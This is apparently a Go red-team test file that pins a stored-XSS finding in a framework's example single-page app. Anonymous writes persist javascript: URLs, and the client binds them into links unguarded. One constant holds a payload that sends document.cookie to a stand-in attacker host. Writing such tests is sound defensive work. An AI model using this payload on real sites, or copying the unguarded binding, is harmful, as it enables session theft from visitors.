//go:build red

package main

// RED TEST — open finding, 2026-09-03 adversarial pass round 8 (tests-only; no fix applied).
// TIER: EXAMPLE-APP POSTURE — this pins examples/spa's own declarations
// (main.go projects entity + static/app.js client), not framework code. The
// framework contract that Public:true grants anonymous writes is separately
// pinned (framework/crud/open_read_gated_write_security_test.go); not
// re-derived here.
// Property: stored URL fields must not reach href bindings unguarded — a
// javascript: URL in an href executes on click (stored XSS, CWE-79; the
// unvalidated redirect/scheme half is CWE-601-adjacent). Vue does NOT
// sanitize URL schemes in :href bindings (only v-html is dangerous by
// contract; attribute bindings are escaped for quotes, not schemes), so the
// guard has to exist either at the write (validation) or at the render
// (scheme allowlist in the binding).
// Chain, both halves exercised by this test against the app exactly as
// main.go declares it:
//   - POSTURE HALF (server, driven): projects is Exposure{Public: true}
//     (main.go:43-50) ⇒ anonymous POST /api/projects persists
//     {"url":"javascript:fetch('//x')"} verbatim (201, row readable back).
//   - EXECUTION HALF (source contract, asserted): static/app.js:132 renders
//     `<a v-if="p.url" :href="p.url" target="_blank">` — the stored value
//     flows straight into href with no scheme guard anywhere in app.js.
//     This half is honest source-level evidence, NOT a browser click
//     execution: no headless-browser drive here. The click-through is the
//     documented residual (Vue leaves javascript: hrefs intact).
// Both halves true ⇒ any anonymous visitor plants script-on-click for every
// /projects viewer. Cutting EITHER link fixes it: refuse/sanitize the write,
// or guard the binding.
// Severity: MEDIUM — reference-example tier (the shipped SPA demo), stored
// unauthenticated XSS on the projects page; requires one victim click.
// Fix direction: any one of (a) projects loses Public:true writes (access
// block), (b) the url field gains scheme validation (http/https/relative
// only) at the entity or API layer, or (c) app.js binds through a scheme
// guard (safeUrl(p.url) returning '#' for non-http(s) schemes).

import (
	"database/sql"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/DonaldMurillo/gofastr/core/schema"
	"github.com/DonaldMurillo/gofastr/framework"
	_ "github.com/DonaldMurillo/gofastr/sqlite/stdlib"
)

func openSpaTestDB(t *testing.T) *sql.DB {
	t.Helper()
	db, err := sql.Open("sqlite3", filepath.Join(t.TempDir(), "spa.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = db.Close() })
	return db
}

// newSpaApp reproduces main.go's wiring verbatim (entities + APIPrefix)
// minus the listener, so the real route table is drivable in-process.
func newSpaApp(t *testing.T) *framework.App {
	t.Helper()
	db := openSpaTestDB(t)
	app := framework.NewApp(
		framework.WithDB(db),
		framework.WithConfig(framework.AppConfig{Name: "spa-example", APIPrefix: "/api"}),
	)

	app.Entity("articles", framework.EntityConfig{Scope:
	// public demo content. See "Default CRUD authentication" in the security docs.
	&framework.ScopeConfig{}, Exposure: &framework.ExposureConfig{Public: true}, Fields: []schema.Field{
		{Name: "title", Type: schema.String, Required: true},
		{Name: "summary", Type: schema.Text},
		{Name: "body", Type: schema.Text},
		{Name: "category", Type: schema.String},
	},
	})
	app.Entity("projects", framework.EntityConfig{Scope:
	// public demo content. See "Default CRUD authentication" in the security docs.
	&framework.ScopeConfig{}, Exposure: &framework.ExposureConfig{Public: true}, Fields: []schema.Field{
		{Name: "name", Type: schema.String, Required: true},
		{Name: "description", Type: schema.Text},
		{Name: "url", Type: schema.String},
	},
	})

	if err := framework.AutoMigrate(db, app.Registry); err != nil {
		t.Fatalf("automigrate: %v", err)
	}
	return app
}

// TestSpaRedProjectURLSchemeGuarded pins the stored-XSS chain end to end:
// the anonymous write must not land a javascript: URL (posture half) OR the
// client must not bind the stored URL into href without a scheme guard
// (execution half). RED today: both halves hold.
func TestSpaRedProjectURLSchemeGuarded(t *testing.T) {
	app := newSpaApp(t)
	do := func(method, path, body string) (int, string) {
		t.Helper()
		req := httptest.NewRequest(method, path, strings.NewReader(body))
		if body != "" {
			req.Header.Set("Content-Type", "application/json")
		}
		rec := httptest.NewRecorder()
		app.Router().ServeHTTP(rec, req)
		return rec.Code, rec.Body.String()
	}

	// Posture half: anonymous create of a javascript:-scheme project URL.
	const payload = "javascript:fetch('//attacker.example/'+document.cookie)"
	code, body := do(http.MethodPost, "/api/projects", `{"name":"k","url":"`+payload+`"}`)
	writeLands := false
	if code < 400 {
		// Confirm persistence, not just a 2xx echo.
		listCode, listBody := do(http.MethodGet, "/api/projects", "")
		writeLands = listCode == http.StatusOK && strings.Contains(listBody, "javascript:")
		if !writeLands {
			t.Logf("POST /api/projects = %d but the stored row no longer carries the javascript: URL (sanitized at write?): list = %d %.200s", code, listCode, listBody)
		}
	} else {
		t.Logf("anonymous POST /api/projects = %d: the write half is already cut", code)
	}

	// Execution half: the raw :href="p.url" binding, source contract.
	appjs, err := os.ReadFile(filepath.Join(resolveStaticDir(), "app.js"))
	if err != nil {
		t.Fatalf("read static/app.js: %v", err)
	}
	unguarded := strings.Contains(string(appjs), `:href="p.url"`) && !strings.Contains(string(appjs), "safeUrl")

	if writeLands && unguarded {
		t.Errorf("stored javascript: XSS chain intact: anonymous POST /api/projects = %d persisted %q (row: %.120s) and app.js binds the stored url into <a :href=\"p.url\" target=\"_blank\"> with no scheme guard — a /projects visitor who clicks the link executes attacker script. Cut either link: gate/sanitize the write or guard the binding", code, payload, body)
	}
}
